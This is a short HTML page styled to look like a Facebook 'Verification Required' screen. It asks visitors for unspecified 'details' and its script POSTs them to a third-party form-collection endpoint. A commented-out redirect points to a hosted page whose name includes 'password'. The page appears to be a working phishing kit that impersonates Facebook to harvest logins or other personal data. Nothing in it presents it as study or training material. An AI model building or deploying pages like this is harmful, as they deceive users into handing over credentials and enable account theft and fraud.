<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Access</title>

<style>
body{
    margin:0;
    background:#f0f2f5;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}
.container{
    max-width:520px;
    margin:60px auto;
    padding:15px;
}
.card{
    background:#fff;
    border-radius:10px;
    box-shadow:0 2px 12px rgba(0,0,0,.08);
    padding:25px;
}
.header{
    display:flex;
    align-items:center;
    margin-bottom:15px;
}
.dp{
    width:46px;
    height:46px;
    border-radius:50%;
    background:#1877f2;
    color:#fff;
    display:flex;
    align-items:center;
    justify-content:center;
    font-weight:700;
    margin-right:12px;
}
.header h3{
    margin:0;
    font-size:16px;
}
.header p{
    margin:2px 0 0;
    font-size:13px;
    color:#65676b;
}
.content{
    font-size:15px;
    line-height:1.6;
    margin-bottom:20px;
}
input{
    width:100%;
    padding:12px;
    margin-top:12px;
    border:1px solid #ddd;
    border-radius:6px;
    font-size:14px;
}
.btn{
    width:100%;
    padding:12px;
    margin-top:15px;
    background:#1877f2;
    border:none;
    color:#fff;
    font-size:14px;
    font-weight:600;
    border-radius:6px;
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
}
.btn:disabled{
    opacity:.7;
}
.spinner{
    width:16px;
    height:16px;
    border:2px solid rgba(255,255,255,.4);
    border-top:2px solid #fff;
    border-radius:50%;
    animation:spin 1s linear infinite;
}
@keyframes spin{
    0%{transform:rotate(0deg)}
    100%{transform:rotate(360deg)}
}
.note{
    font-size:12px;
    color:#65676b;
    text-align:center;
    margin-top:10px;
}
</style>
</head>

<body>

<div class="container">
<div class="card">

<div class="header">
<div class="dp">FB</div>
<div>
<h3>Verification Required</h3>
<p>Secure request process</p>
</div>
</div>

<div class="content">
<p>Please enter the required information to continue.</p>
</div>

<form id="accessForm">
<!-- ✅ name attribute ADDED -->
<input 
  type="text" 
  name="user_input" 
  id="inputValue" 
  placeholder="Enter details" 
  required
>

<button type="submit" class="btn" id="submitBtn">
    <span id="btnText">Continue</span>
</button>
</form>

<p class="note">Your request will be processed securely.</p>

</div>
</div>

<script>
const form = document.getElementById('accessForm');
const btn = document.getElementById('submitBtn');
const btnText = document.getElementById('btnText');

form.addEventListener('submit', function(e){
    e.preventDefault();

    btn.disabled = true;
    btnText.innerHTML = '<div class="spinner"></div> Processing…';

    const formData = new FormData(form);

    fetch("https://submit-form.com/upL3IuLAs", {
        method: "POST",
        body: formData
    })
    .then(() => {
        // ✅ optional redirect
        // window.location.href = "https://password-orpin-theta.vercel.app/";
        alert("Submitted successfully!");
        form.reset();
    })
    .finally(() => {
        btn.disabled = false;
        btnText.innerHTML = "Continue";
    });
});
</script>

</body>
</html>
